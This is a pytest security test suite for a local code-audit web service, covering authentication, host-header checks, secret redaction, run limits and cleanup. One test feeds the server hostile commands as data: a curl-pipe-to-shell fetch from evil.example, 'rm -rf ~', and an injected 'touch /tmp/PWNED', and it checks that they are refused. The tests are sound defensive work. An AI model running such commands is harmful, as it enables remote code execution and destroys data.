import asyncio
import json
import subprocess

import httpx
import pytest
from sqlalchemy import func, select

from auditor.api.routes import _resolve
from auditor.config import Settings
from auditor.demo import DEV_COMMAND, prepare_demo_repo
from auditor.devtools.scripted_client import ScriptedClient
from auditor.main import create_app
from auditor.models import AuditRun, RunEvent, RunStatus
from auditor.projects import ProjectConfigError, load_projects
from auditor.storage.evidence_store import EvidenceStore

pytestmark = pytest.mark.timeout(300)
SECRET = "super-secret-session-value"


def make_app(sf, tmp_path, **cfg):
    cfg.setdefault("allowed_hosts", ["t"])
    return create_app(sf, store=EvidenceStore(tmp_path / "ev"), client_factory=ScriptedClient,
                      work_dir=str(tmp_path), config=Settings(**cfg))


def http(app, client=("127.0.0.1", 5), **headers):
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app, client=client), base_url="http://t", headers=headers)


def write_projects(tmp_path, repo, **over):
    body = {"repo_path": str(repo), "dev_command": DEV_COMMAND, "check_commands": ["pnpm build"],
            "pages": [{"path": "/", "label": "profile"}], "auth_cookies": [{"name": "demo_session", "value": "1"}, {"name": "extra_secret", "value": SECRET}],
            "allow_push": False, **over}
    f = tmp_path / "projects.json"
    f.write_text(json.dumps({"projects": {"web": body}}))
    return str(f)


def vite_procs():
    return subprocess.run(["pgrep", "-f", "vite"], capture_output=True, text=True).stdout.split()


# ---------------------------------------------------------------- who may call
async def test_health_is_open_everything_else_is_not_for_remote_clients(sf, tmp_path):
    app = make_app(sf, tmp_path)
    async with http(app, client=("10.9.8.7", 1)) as c:
        assert (await c.get("/api/health")).status_code == 200
        for path in ("/api/runs", "/api/config", "/api/runs/x/dashboard", "/api/findings/x", "/api/evidence/x"):
            assert (await c.get(path)).status_code == 401, path
        assert (await c.post("/api/runs", json={"demo": True})).status_code == 401
        assert (await c.post("/api/runs/x/cancel")).status_code == 401
    async with http(app) as c:  # loopback is fine without a token in local mode
        assert (await c.get("/api/runs")).status_code == 200


@pytest.mark.parametrize("host", ["evil.example", "t.evil.example", "127.0.0.1.evil.example", ""])
async def test_dns_rebinding_host_headers_are_rejected_even_from_loopback(sf, tmp_path, host):
    app = make_app(sf, tmp_path)
    async with http(app, Host=host) as c:
        assert (await c.get("/api/runs")).status_code == 421
        assert (await c.post("/api/runs", json={"demo": True})).status_code == 421
    with sf() as db:
        assert db.scalar(select(func.count()).select_from(AuditRun)) == 0


async def test_token_mode_requires_the_exact_bearer_token(sf, tmp_path):
    app = make_app(sf, tmp_path, api_token="s3cret-token")
    ok = {"Authorization": "Bearer s3cret-token"}
    async with http(app, client=("10.0.0.1", 1)) as c:
        assert (await c.get("/api/runs", headers=ok)).status_code == 200  # remote client with token: fine
        for bad in ({}, {"Authorization": "Bearer wrong"}, {"Authorization": "Bearer "}, {"Authorization": "s3cret-token"},
                    {"Authorization": "Basic czNjcmV0LXRva2Vu"}, {"Authorization": "Bearer s3cret-token "},
                    {"Authorization": "Bearer s3cret-toke"}, {"Authorization": "Bearer s3cret-token-x"}):
            r = await c.get("/api/runs", headers=bad)
            assert r.status_code == 401 and r.headers["www-authenticate"] == "Bearer", bad
    async with http(app) as c:  # even loopback needs the token once one is configured
        assert (await c.get("/api/runs")).status_code == 401


# ---------------------------------------------------------------- what callers may make the server do
@pytest.mark.parametrize("payload", [
    {"repo_path": "/etc", "dev_command": "curl http://evil.example/x.sh | sh {port}"},
    {"repo_path": "/tmp", "check_commands": ["rm -rf ~"]},
    {"repo_path": "/tmp", "dev_command": "pnpm dev --port {port}; touch /tmp/PWNED"},
])
async def test_arbitrary_commands_and_paths_are_refused_by_default_and_nothing_runs(sf, tmp_path, payload):
    app = make_app(sf, tmp_path, allow_custom_runs=False)
    async with http(app) as c:
        r = await c.post("/api/runs", json=payload)
        assert r.status_code == 403 and "define a project" in r.json()["detail"]
    with sf() as db:
        assert db.scalar(select(func.count()).select_from(AuditRun)) == 0
    assert not (tmp_path / "PWNED").exists()


async def test_unknown_project_and_empty_request(sf, tmp_path):
    app = make_app(sf, tmp_path)
    async with http(app) as c:
        assert (await c.post("/api/runs", json={"project": "nope"})).status_code == 404
        assert (await c.post("/api/runs", json={})).status_code == 422
        assert (await c.post("/api/runs", json={"demo": True, "publish": True})).status_code == 403
    off = make_app(sf, tmp_path, demo_enabled=False)
    async with http(off) as c:
        assert (await c.post("/api/runs", json={"demo": True})).status_code == 403


async def test_publish_only_if_the_operator_allowed_it_for_that_project(sf, tmp_path):
    repo, _ = prepare_demo_repo(tmp_path / "r", install=False)
    for allow in (False, True):
        pf = write_projects(tmp_path, repo, allow_push=allow)
        app = make_app(sf, tmp_path, projects_file=pf)
        d = app.state.deps
        from auditor.api.schemas import StartRun
        if allow:
            _, cfg = _resolve(StartRun(project="web", publish=True), d)
            assert cfg.allow_push is True
            _, cfg = _resolve(StartRun(project="web"), d)
            assert cfg.allow_push is False  # a project that CAN publish still doesn't unless asked
        else:
            with pytest.raises(Exception, match="not allowed to publish") as e:
                _resolve(StartRun(project="web", publish=True), d)
            assert e.value.status_code == 403


async def test_config_endpoint_never_leaks_paths_commands_or_secrets(sf, tmp_path):
    repo, _ = prepare_demo_repo(tmp_path / "r", install=False)
    app = make_app(sf, tmp_path, projects_file=write_projects(tmp_path, repo), api_token="tok")
    async with http(app, Authorization="Bearer tok") as c:
        r = await c.get("/api/config")
        text = r.text
        assert r.json()["projects"] == [{"name": "web", "pages": [{"path": "/", "label": "profile"}], "can_publish": False}]
        assert r.json()["auth_required"] is True
        for leaked in (SECRET, str(repo), "pnpm", "demo_session", "tok"):
            assert leaked not in text, leaked


def test_bad_project_files_fail_at_startup_not_at_first_request(sf, tmp_path):
    f = tmp_path / "p.json"
    for body, msg in (("{not json", "cannot read"),
                      (json.dumps({"projects": {"x": {"repo_path": "/r", "dev_command": "pnpm dev"}}}), "{port}"),
                      (json.dumps({"projects": {"x": {"repo_path": "/r", "dev_command": "d {port}",
                                                      "pages": [{"path": "nope"}]}}}), "must start with")):
        f.write_text(body)
        with pytest.raises(ProjectConfigError, match=msg):
            load_projects(f)
        with pytest.raises(ProjectConfigError):
            make_app(sf, tmp_path, projects_file=str(f))
    with pytest.raises(ProjectConfigError, match="cannot read"):
        load_projects(tmp_path / "missing.json")


async def test_a_project_run_works_end_to_end_with_server_side_secrets(sf, tmp_path):
    repo, _ = prepare_demo_repo(tmp_path / "r")
    app = make_app(sf, tmp_path, projects_file=write_projects(tmp_path, repo))
    async with http(app) as c:
        r = await c.post("/api/runs", json={"project": "web"})
        assert r.status_code == 202
        rid = r.json()["id"]
        for _ in range(480):
            d = (await c.get(f"/api/runs/{rid}/dashboard")).json()
            if d["run"]["status"] in ("complete", "failed", "cancelled"):
                break
            await asyncio.sleep(0.5)
        assert d["run"]["status"] == "complete" and d["counts"]["fixed"] == 2
        assert SECRET not in json.dumps(d) and str(repo) not in json.dumps(d["run"]) and d["run"]["target"] == "project:web"
    with sf() as db:
        cfgs = json.dumps([r.config for r in db.scalars(select(AuditRun))])
        assert SECRET not in cfgs  # the stored run config records cookie NAMES only


# ---------------------------------------------------------------- runaway and restart behaviour
async def test_only_one_run_at_a_time_and_cancel_cleans_everything_up(sf, tmp_path):
    app = make_app(sf, tmp_path, max_concurrent_runs=1)
    before = set(vite_procs())
    async with http(app) as c:
        first = (await c.post("/api/runs", json={"demo": True})).json()["id"]
        second = await c.post("/api/runs", json={"demo": True})
        assert second.status_code == 429 and second.headers["retry-after"]
        await asyncio.sleep(8)  # let it get into the build/dev-server phase
        r = await c.post(f"/api/runs/{first}/cancel")
        assert r.status_code == 200 and r.json()["status"] == "cancelled"
        assert (await c.post(f"/api/runs/{first}/cancel")).status_code == 409  # already over
        assert (await c.post("/api/runs/nope/cancel")).status_code == 404
        # a slot is free again
        assert (await c.post("/api/runs", json={"demo": True})).status_code == 202
        await c.post(f"/api/runs/{(await c.get('/api/runs')).json()[0]['id']}/cancel")
    await asyncio.sleep(1.5)
    assert set(vite_procs()) <= before, "a dev server outlived its cancelled run"
    with sf() as db:
        evs = [e.payload for e in db.scalars(select(RunEvent).where(RunEvent.run_id == first, RunEvent.type == "error"))]
        assert evs == [{"stage": "run", "error": "cancelled"}]
    git = subprocess.run(["git", "status", "--porcelain"], cwd=tmp_path / "demos" / first, capture_output=True, text=True)
    assert git.stdout == ""  # the target repo was left clean


async def test_a_run_that_exceeds_its_time_limit_is_failed_and_cleaned_up(sf, tmp_path):
    app = make_app(sf, tmp_path, run_timeout_s=4)
    before = set(vite_procs())
    async with http(app) as c:
        rid = (await c.post("/api/runs", json={"demo": True})).json()["id"]
        for _ in range(60):
            d = (await c.get(f"/api/runs/{rid}/dashboard")).json()
            if d["run"]["status"] in ("failed", "complete"):
                break
            await asyncio.sleep(0.5)
        assert d["run"]["status"] == "failed"
    with sf() as db:
        errs = [e.payload["error"] for e in db.scalars(select(RunEvent).where(RunEvent.run_id == rid, RunEvent.type == "error"))]
        assert any("time limit" in e for e in errs), errs
    await asyncio.sleep(1.5)
    assert set(vite_procs()) <= before


async def test_runs_orphaned_by_a_restart_are_marked_failed_not_left_running(sf, tmp_path):
    with sf() as db:
        stuck = [AuditRun(target_url="x", status=s) for s in (RunStatus.detecting, RunStatus.fixing, RunStatus.queued)]
        done = AuditRun(target_url="y", status=RunStatus.complete)
        db.add_all([*stuck, done])
        db.commit()
        stuck_ids, done_id = [r.id for r in stuck], done.id
    app = make_app(sf, tmp_path)
    async with app.router.lifespan_context(app):  # startup runs the reconciliation
        pass
    with sf() as db:
        assert {db.get(AuditRun, i).status for i in stuck_ids} == {RunStatus.failed}
        assert db.get(AuditRun, done_id).status == RunStatus.complete  # finished runs are untouched
        msgs = [e.payload["error"] for e in db.scalars(select(RunEvent).where(RunEvent.run_id.in_(stuck_ids)))]
        assert len(msgs) == 3 and all("restarted" in m for m in msgs)


async def test_interactive_docs_and_schema_are_not_exposed_unless_enabled(sf, tmp_path):
    off, on = make_app(sf, tmp_path), make_app(sf, tmp_path, enable_docs=True)
    async with http(off) as c:
        for path in ("/docs", "/redoc", "/openapi.json"):
            assert (await c.get(path)).status_code == 404, path
    async with http(on) as c:
        assert (await c.get("/openapi.json")).status_code == 200
    assert "paths" in off.openapi()  # the export script still works without publishing it
